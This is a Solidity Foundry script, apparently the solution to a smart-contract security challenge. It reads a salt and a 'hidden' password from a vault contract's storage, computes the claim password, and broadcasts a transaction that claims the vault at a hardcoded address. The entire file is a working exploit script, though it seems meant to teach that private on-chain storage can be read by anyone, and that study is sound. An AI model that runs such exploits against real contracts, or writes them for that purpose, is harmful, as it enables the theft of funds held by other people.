// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import {Script, console} from "forge-std/Script.sol";
import {Vault} from "../src/Vault.sol";

contract VaultAttackScriptOffchain is Script {
    // The vault attack offchain script retrieves the salt and hidden password
    // from the contract storage offchain using cast, hardhat or RPC calls.
    // It then calculates the password and claims the vault.
    address public constant VAULT_ADDRESS = 0x7b8040fB84993f88546B46D29899A60Ea60E6FCc;
    uint256 salt = 0x00000000000000000000000000000000000000000000000000000000687117cf;
    uint256 hiddenPassword = 0x00000000000000000000000000000000000000000000000000000000075bcd3f;
    uint256 password = uint256(keccak256(abi.encode(hiddenPassword + salt)));

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        console.log("Salt:", salt);
        console.log("Hidden Password:", hiddenPassword);

        Vault(payable(VAULT_ADDRESS)).claim(password);

        vm.stopBroadcast();
    }
}
